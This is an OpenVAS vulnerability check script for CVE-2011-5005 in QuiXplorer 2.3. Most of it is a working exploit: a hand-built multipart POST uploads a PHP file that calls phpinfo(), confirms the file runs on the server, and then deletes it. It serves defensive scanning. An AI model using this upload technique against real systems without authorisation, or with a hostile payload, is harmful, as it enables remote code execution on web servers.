###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_QuiXplorer_50673.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# QuiXplorer 'index.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "QuiXplorer is prone to an arbitrary-file-upload vulnerability because
the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it
in the context of the webserver process.

QuiXplorer 2.3 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103377");
 script_bugtraq_id(50673);
 script_cve_id("CVE-2011-5005");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 9352 $");

 script_name("QuiXplorer 'index.php' Arbitrary File Upload Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50673");
 script_xref(name : "URL" , value : "http://quixplorer.sourceforge.net/");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-01-05 11:51:25 +0100 (Thu, 05 Jan 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_quixplorer_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("QuiXplorer/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"QuiXplorer")){
  exit(0);
}

url = string(dir,"/index.php?action=upload&order=type&srt=yes"); 
host = http_host_name(port:port);
filename = "openvas-" + rand() + ".php";
len = 1982 + strlen(filename);

req = string("POST ",url," HTTP/1.1\r\n",
             "Host: ",host,"\r\n",
             "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
             "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
             "Accept-Encoding: gzip, deflate\r\n",
             "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
             "DNT: 1\r\n",
             "Connection: keep-alive\r\n",
             "Referer: http://",host,url,"\r\n",
             "Content-Type: multipart/form-data; boundary=---------------------------5307133891507148240988240459\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="MAX_FILE_SIZE"',"\r\n",
             "\r\n",
             "2097152\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="confirm"',"\r\n",
             "\r\n",
             "true\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename="',filename,'"',"\r\n",
             "Content-Type: application/x-php\r\n",
             "\r\n",
             '<?php phpinfo(); ?>',"\r\n",
             "\r\n", 
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n", 
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n", 
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n", 
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n", 
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459\r\n",
             'Content-Disposition: form-data; name="userfile[]"; filename=""',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             "\r\n",
             "-----------------------------5307133891507148240988240459--\r\n");


result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result =~ "HTTP/1.. 302" && "Location:" >< result) {

  lines = split(result);
  foreach line (lines) {

    if(egrep(pattern:"Location:",string:line)) {

      location = eregmatch(pattern:"Location: (.*)$",string:line);
      break;

    }

  }

  if(isnull(location[1]))exit(0);
  
  url = chomp(location[1]);
  req1 = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req1, bodyonly:FALSE);

  if(filename >!< buf)exit(0);

  lines = split(buf);
  foreach line (lines) {

    if(filename >< line && "<A HREF=" >< line) {

      url = eregmatch(pattern:'<A HREF="([^"]+)"',string:line);
      break;
    }

  }
  
  if(isnull(url[1]))exit(0);

  req2 = http_get(item:url[1], port:port);
  buf2 = http_keepalive_send_recv(port:port, data:req2, bodyonly:FALSE);

  if("<title>phpinfo()" >< buf2) {

    # delete uploaded file
    del = "do_action=delete&first=y&selitems%5B%5D=" + filename;
    req = string("POST ",dir,"/index.php?action=post&order=type&srt=yes HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                 "Accept-Encoding: gzip, deflate\r\n",
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                 "DNT: 1\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://",host,url,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",strlen(del),"\r\n",
                 "\r\n",
                 del);  

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    security_message(port:port);
    exit(0);
  }

}

exit(0);
